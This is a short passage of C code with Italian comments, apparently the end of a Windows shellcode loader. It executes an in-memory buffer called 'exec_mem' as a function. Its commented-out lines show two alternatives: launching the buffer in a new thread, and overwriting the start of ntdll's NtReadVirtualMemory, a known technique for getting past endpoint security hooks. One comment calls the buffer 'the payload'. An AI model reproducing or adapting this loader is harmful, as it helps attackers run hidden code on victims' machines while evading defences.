    //printf("%d", rv);

    //se tutto ok lancia il payload
    //if ( rv != 0 ) {        
    //inizializzo un thread che in callback esegue il codice nel buffer
    Sleep(2000);
    printf("PRIMA DI CREATETHREAD");
    //WriteProcessMemory(GetCurrentProcess(), GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtReadVirtualMemory"), "\x4c\x8b\xd1\xb8\x3c", 5, NULL);

    //th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);

    ((void(*)())exec_mem)();

	//}

	return 0;
}
